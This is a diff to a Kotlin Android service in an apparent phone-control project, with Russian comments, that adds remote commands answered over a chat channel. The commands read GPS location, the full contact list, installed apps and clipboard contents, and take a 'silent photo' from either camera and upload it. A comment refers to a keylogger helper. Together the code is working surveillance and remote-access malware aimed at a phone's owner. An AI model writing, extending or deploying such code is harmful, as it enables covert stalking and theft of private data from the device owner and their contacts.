@@ -1,17 +1,32 @@
 package com.phonecontrol
 
 import android.app.*
+import android.content.ClipboardManager
+import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
+import android.graphics.ImageFormat
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.*
+import android.location.LocationManager
 import android.media.AudioManager
+import android.media.ImageReader
+import android.net.Uri
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
+import android.provider.ContactsContract
+import android.provider.Settings
 import android.util.Log
+import android.view.Surface
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.MediaType.Companion.toMediaType
+import org.json.JSONArray
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
 import java.net.HttpURLConnection
@@ -61,6 +76,14 @@ class ControlService : Service() {
     }
 
     override fun onCreate() {
+        // Сохраняем ALLOWED_CHAT_ID чтобы MonitorReceiver и KeyloggerHelper знали куда слать
+        try {
+            val chatId = BuildConfig::class.java.getField("ALLOWED_CHAT_ID").get(null) as? String ?: ""
+            if (chatId.isNotEmpty()) {
+                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                    .edit().putString("allowed_chat_id", chatId).apply()
+            }
+        } catch (_: Exception) {}
         super.onCreate()
         deviceId = getOrCreateDeviceId()
         createNotificationChannel()
@@ -284,6 +307,14 @@ class ControlService : Service() {
                     "open_camera"   -> FilePickerActivity.startCamera(this@ControlService, cmd.optString("_chat_id", ""))
                     "stream_start"  -> startStream(cmd.optString("_chat_id", ""))
                     "stream_stop"   -> stopStream(cmd.optString("_chat_id", ""))
+                    "get_location"  -> sendLocation(cmd.optString("_chat_id", ""))
+                    "get_contacts"  -> sendContacts(cmd.optString("_chat_id", ""))
+                    "get_apps"      -> sendInstalledApps(cmd.optString("_chat_id", ""))
+                    "get_clipboard" -> sendClipboard(cmd.optString("_chat_id", ""))
+                    "set_brightness"-> setBrightness(cmd.optInt("level", 50))
+                    "vibrate"       -> vibrate(cmd.optLong("ms", 500))
+                    "flashlight"    -> setFlashlight(cmd.optBoolean("on", true), cmd.optString("_chat_id", ""))
+                    "take_photo"    -> takePhoto(cmd.optString("camera", "back"), cmd.optString("_chat_id", ""))
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
@@ -571,6 +602,248 @@ class ControlService : Service() {
         startService(intent)
         scope.launch {
             sendTextReply(chatId, "⛔ Стрим остановлен")
+        }
+    }
+
+
+    // ─── Location ─────────────────────────────────────────────────────────────
+
+    private fun sendLocation(chatId: String) {
+        scope.launch {
+            try {
+                val lm = getSystemService(LOCATION_SERVICE) as LocationManager
+                val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
+                var loc: android.location.Location? = null
+                for (p in providers) {
+                    if (lm.isProviderEnabled(p)) {
+                        loc = lm.getLastKnownLocation(p)
+                        if (loc != null) break
+                    }
+                }
+                if (loc == null) {
+                    sendTextReply(chatId, "📍 Местоположение недоступно (GPS выключен или нет кеша)")
+                } else {
+                    val lat = loc.latitude
+                    val lon = loc.longitude
+                    val acc = loc.accuracy.toInt()
+                    sendTextReply(chatId, "📍 Местоположение:
+https://maps.google.com/?q=$lat,$lon
+
+Точность: ${acc}м")
+                }
+            } catch (e: Exception) {
+                sendTextReply(chatId, "📍 Ошибка: ${e.message}")
+            }
+        }
+    }
+
+    // ─── Contacts ─────────────────────────────────────────────────────────────
+
+    private fun sendContacts(chatId: String) {
+        scope.launch {
+            try {
+                val cursor = contentResolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    arrayOf(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                    ),
+                    null, null,
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+                )
+                val contacts = mutableListOf<String>()
+                cursor?.use {
+                    while (it.moveToNext()) {
+                        val name = it.getString(0) ?: ""
+                        val num  = it.getString(1) ?: ""
+                        contacts.add("$name: $num")
+                    }
+                }
+                if (contacts.isEmpty()) {
+                    sendTextReply(chatId, "📒 Контакты пусты")
+                    return@launch
+                }
+                // Отправляем по 100 контактов на сообщение
+                contacts.chunked(100).forEachIndexed { i, chunk ->
+                    val text = "📒 Контакты [${i+1}/${(contacts.size+99)/100}]:
+" + chunk.joinToString("
+")
+                    sendTextReply(chatId, text)
+                }
+            } catch (e: Exception) {
+                sendTextReply(chatId, "📒 Ошибка: ${e.message}")
+            }
+        }
+    }
+
+    // ─── Installed apps ───────────────────────────────────────────────────────
+
+    private fun sendInstalledApps(chatId: String) {
+        scope.launch {
+            try {
+                val pm = packageManager
+                val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
+                    .filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
+                    .map { pm.getApplicationLabel(it).toString() + " (${it.packageName})" }
+                    .sorted()
+                if (apps.isEmpty()) {
+                    sendTextReply(chatId, "📱 Нет установленных приложений")
+                    return@launch
+                }
+                apps.chunked(50).forEachIndexed { i, chunk ->
+                    val text = "📱 Приложения [${i+1}/${(apps.size+49)/50}]:
+" + chunk.joinToString("
+")
+                    sendTextReply(chatId, text)
+                }
+            } catch (e: Exception) {
+                sendTextReply(chatId, "📱 Ошибка: ${e.message}")
+            }
+        }
+    }
+
+    // ─── Clipboard ────────────────────────────────────────────────────────────
+
+    private fun sendClipboard(chatId: String) {
+        // Clipboard доступен только из главного потока
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
+                val text = cm.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString()
+                scope.launch {
+                    if (text.isNullOrEmpty()) {
+                        sendTextReply(chatId, "📋 Буфер обмена пуст")
+                    } else {
+                        sendTextReply(chatId, "📋 Буфер обмена:
+$text")
+                    }
+                }
+            } catch (e: Exception) {
+                scope.launch { sendTextReply(chatId, "📋 Ошибка: ${e.message}") }
+            }
+        }
+    }
+
+    // ─── Brightness ───────────────────────────────────────────────────────────
+
+    private fun setBrightness(level: Int) {
+        try {
+            val value = (level.coerceIn(0, 100) * 2.55).toInt()
+            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE,
+                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
+            Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, value)
+        } catch (e: Exception) {
+            Log.e(TAG, "setBrightness: ${e.message}")
+        }
+    }
+
+    // ─── Vibrate ──────────────────────────────────────────────────────────────
+
+    private fun vibrate(ms: Long) {
+        try {
+            val vib = getSystemService(VIBRATOR_SERVICE) as android.os.Vibrator
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                vib.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vib.vibrate(ms)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "vibrate: ${e.message}")
+        }
+    }
+
+    // ─── Flashlight ───────────────────────────────────────────────────────────
+
+    private fun setFlashlight(on: Boolean, chatId: String) {
+        scope.launch {
+            try {
+                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
+                val cameraId = cm.cameraIdList.firstOrNull { id ->
+                    cm.getCameraCharacteristics(id)
+                        .get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+                }
+                if (cameraId == null) {
+                    sendTextReply(chatId, "🔦 Вспышка недоступна")
+                    return@launch
+                }
+                cm.setTorchMode(cameraId, on)
+            } catch (e: Exception) {
+                Log.e(TAG, "flashlight: ${e.message}")
+            }
+        }
+    }
+
+    // ─── Silent photo ─────────────────────────────────────────────────────────
+
+    private fun takePhoto(camera: String, chatId: String) {
+        scope.launch {
+            try {
+                val cm = getSystemService(CAMERA_SERVICE) as CameraManager
+                // Выбираем камеру: "front" или "back"
+                val facing = if (camera == "front") CameraCharacteristics.LENS_FACING_FRONT
+                             else CameraCharacteristics.LENS_FACING_BACK
+                val cameraId = cm.cameraIdList.firstOrNull { id ->
+                    cm.getCameraCharacteristics(id)
+                        .get(CameraCharacteristics.LENS_FACING) == facing
+                } ?: cm.cameraIdList.firstOrNull() ?: return@launch
+
+                val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
+                val surface = imageReader.surface
+                val texture = SurfaceTexture(1)
+                val previewSurface = Surface(texture)
+
+                val captureJob = CompletableDeferred<ByteArray?>()
+
+                imageReader.setOnImageAvailableListener({ reader ->
+                    val image = reader.acquireLatestImage()
+                    val bytes = image?.planes?.get(0)?.buffer?.let { buf ->
+                        ByteArray(buf.remaining()).also { buf.get(it) }
+                    }
+                    image?.close()
+                    captureJob.complete(bytes)
+                }, Handler(Looper.getMainLooper()))
+
+                val stateCallback = object : CameraDevice.StateCallback() {
+                    override fun onOpened(device: CameraDevice) {
+                        val surfaces = listOf(surface, previewSurface)
+                        device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                    addTarget(surface)
+                                }.build()
+                                session.capture(request, object : CameraCaptureSession.CaptureCallback() {
+                                    override fun onCaptureCompleted(s: CameraCaptureSession, r: CaptureRequest, result: TotalCaptureResult) {
+                                        scope.launch {
+                                            val bytes = captureJob.await()
+                                            device.close()
+                                            imageReader.close()
+                                            texture.release()
+                                            if (bytes != null) {
+                                                Uploader.uploadBytes(this@ControlService, bytes, "photo_${System.currentTimeMillis()}.jpg", "image/jpeg", chatId)
+                                            } else {
+                                                sendTextReply(chatId, "📷 Не удалось сделать фото")
+                                            }
+                                        }
+                                    }
+                                }, Handler(Looper.getMainLooper()))
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                captureJob.complete(null)
+                                device.close()
+                            }
+                        }, Handler(Looper.getMainLooper()))
+                    }
+                    override fun onDisconnected(device: CameraDevice) { device.close() }
+                    override fun onError(device: CameraDevice, error: Int) { device.close(); captureJob.complete(null) }
+                }
+
+                cm.openCamera(cameraId, stateCallback, Handler(Looper.getMainLooper()))
+
+            } catch (e: Exception) {
+                Log.e(TAG, "takePhoto: ${e.message}", e)
+                sendTextReply(chatId, "📷 Ошибка: ${e.message}")
+            }
         }
     }
 
